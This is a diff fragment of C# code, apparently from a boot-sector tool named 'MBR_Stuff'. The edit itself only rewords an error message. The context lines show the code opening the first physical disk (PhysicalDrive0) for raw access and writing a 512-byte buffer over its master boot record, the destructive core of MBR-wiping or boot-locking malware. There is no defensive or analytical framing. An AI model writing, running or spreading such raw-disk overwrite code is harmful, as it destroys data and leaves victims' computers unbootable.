@@ -19,7 +19,7 @@ namespace MBR_Stuff
             IntPtr mbrPointer = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x1 | (uint)0x2, z, 0x3, 0,z);
             if (mbrPointer == (IntPtr)(-0x1))
             {
-                Console.WriteLine("Run as administrator");
+                Console.WriteLine("Run with admin privileges");
                 Environment.Exit(0);
             }
             if (WriteFile(mbrPointer,newData,512,out uint lpNumberOfBytesWritten,z))
